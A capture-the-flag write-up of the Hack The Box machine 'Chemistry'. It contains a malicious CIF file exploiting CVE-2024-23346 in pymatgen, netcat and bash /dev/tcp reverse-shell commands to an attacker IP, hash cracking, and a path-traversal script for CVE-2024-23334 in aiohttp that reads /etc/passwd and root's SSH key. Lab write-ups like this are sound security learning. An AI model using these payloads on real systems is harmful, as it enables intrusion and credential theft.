+++
title = "HTB - Chemistry"
date = "2025-03-03T00:00:00+00:00"
tags = ["ctf", "htb", "web", "python", "cif", "path traversal", "AioHTTP", "CVE-2024-23346", "CVE-2024-23334"]
description = "Writeup for the 'Easy' rated machine: Chemistry"
+++

{{<lead>}}
Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the `pymatgen` (CVE-2024-23346) Python library by uploading a malicious `CIF` file to the hosted `CIF Analyzer` website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as `rosa` user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called `AioHTTP` (CVE-2024-23334) which is used on the web application running internally to read the root flag.
{{</lead>}}

## Port Scanning

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?   syn-ack
```

We got 2 ports open:
- 22 running ssh
- 5000 running a web server

## Website

Navigating to `http://10.10.11.38:5000`, we get the following page:

{{<figure src="/img/htb/chemistry/home_page.png" position=center caption="Home Page">}}

The content of the home page already gives us a hint: 

> This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.

We also have the possibility to log in or to create an account.

### Login Page
On the login page, I tried submitting some defaults credentials and quickly tested for basic sqli but without success:

{{<figure src="/img/htb/chemistry/login_page_invalid_creds.png" position=center caption="Invalid credentials">}}

### Creating an account
We can try to register an account at `/register`

{{<figure src="/img/htb/chemistry/create_account.png" position=center caption="Registering an account">}}

After registering an account we get access to the following dashboard:

{{<figure src="/img/htb/chemistry/dashboard.png" position=center caption="Dashboard">}}

The website allows us to upload a CIF file. It also provides us with an example at `/static/example.cif`:

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

### Exploit for CIF files
A searching for exploits involving CIF files, we find [this security report](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) showing how we can get RCE with a malicious CIF file using this POC:

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Let's replace the command with a reverse shell:

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.4 1337 >/tmp/f");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Now let's upload it:

{{<figure src="/img/htb/chemistry/upload_cif.png" position=center caption="Uploading malicious CIF file">}}

After clicking on upload, we see that we can view it or delete it:

{{<figure src="/img/htb/chemistry/after_upload.png" position=center caption="File uploaded">}}

If we click on view, we get a 500 Internal server error, and we don't get a reverse shell.

{{<figure src="/img/htb/chemistry/500_err.png" position=center caption="500 Internal server error">}}

However if we replace the command with just `nc <IP> <PORT>`, we get a connection. 

In this case, we can upload the reverse shell, and then execute it

{{<figure src="/img/htb/chemistry/hosting_revshell.png" position=center caption="Hosting reverse shell with python http server">}}

The file `shell.sh` contains the following:

```bash
bash -i >& /dev/tcp/10.10.14.4/1337 0>&1
```

After, uploading and clicking on view, we see the file was downloaded:

{{<figure src="/img/htb/chemistry/web_server_hit.png" position=center caption="Hit on python http server">}}

We can now change the command, so that our reverse shell is executed

{{<figure src="/img/htb/chemistry/exec_shell.png" position=center caption="Changing the command in cif file">}}

After re-uploading the file, and then clicking on View, we finally get a shell back:

{{<figure src="/img/htb/chemistry/got_shell.png" position=center caption="Reverse shell">}}

## Foothold & User Flag
In our current directory, we find the source code of the website in `app.py` which also contains credentials:

{{<figure src="/img/htb/chemistry/db_pass.png" position=center caption="Credentials in app.py">}}

After looking around some more, we find a the sqlite database inside the `instance` directory.

```
app@chemistry:~/instance$ file database.db
database.db: SQLite 3.x database, last written using SQLite version 3031001
```

Looking at the contents of this file with `strings`, we are able to get the hashes of the users:

{{<figure src="/img/htb/chemistry/hashes.png" position=center caption="Users' hashes">}}

Let's try to crack the hash of the user `rosa`, since they are on the machine:

```bash
hashcat -m 0 '<HASH>' /usr/share/wordlists/rockyou.txt
```

{{<figure src="/img/htb/chemistry/rosa_cracked.png" position=center caption="">}}

We can ssh as `rosa` and retrieve the user flag

{{<figure src="/img/htb/chemistry/user.png" position=center caption="Usdr flag obtained !">}}

## Root Flag
After some enumeration, we find out that something is running on `127.0.0.1:8080`

{{<figure src="/img/htb/chemistry/netstat.png" position=center caption="Netstat output">}}

We can forward that port to our machine with:

```bash
ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
```

Now after going to `http://127.0.0.1:8080`, we get access to this website allowing us to list services:

{{<figure src="/img/htb/chemistry/monitoring_site.png" position=center caption="Monitoring website">}}

Looking at the response headers, we see something unusual for the `Server` header (`Python/3.9 aiohttp/3.9.1`):

{{<figure src="/img/htb/chemistry/res_headers.png" position=center caption="_Response Headers_">}}

After some reasearch, we see that it might be vulnerable to CVE-2024-23334 which is a path traversal vulnerability.

Using this [poc](https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh) (with some little changes):

```bash
#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/"
file="etc/passwd"

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

We were able to retrieve the `/etc/passwd` file:

{{<figure src="/img/htb/chemistry/etc_passwd.png" position=center caption="Reading /etc/passwd">}}

We can repeat the same process in order to read the private key of the root user:

{{<figure src="/img/htb/chemistry/id_rsa.png" position=center caption="Reading root's private key">}}

We can use it to login as root and retrieve the flag:

{{<figure src="/img/htb/chemistry/root.png" position=center caption="Root flag obtained !">}}
